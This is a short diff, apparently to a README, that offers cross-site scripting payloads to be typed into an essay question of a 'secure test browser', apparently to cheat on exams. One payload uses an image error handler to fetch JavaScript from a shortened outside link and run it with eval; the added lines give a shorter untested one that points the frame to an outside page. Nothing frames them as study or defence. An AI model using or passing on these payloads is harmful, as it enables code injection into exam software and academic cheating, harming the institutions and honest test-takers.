@@ -3,3 +3,9 @@ This can be used for xss in secure test browser just type this into essay questi
 ```
 <img src=# onerror='fetch("https://tinyurl.com/payloadcheat").then(r => r.text()).then(eval);'>
 ```
+
+
+Or Shorter but havent test it yet
+```
+<img src=x onerror=frameElement.src='https://joaawd.github.io/p/'>  
+```
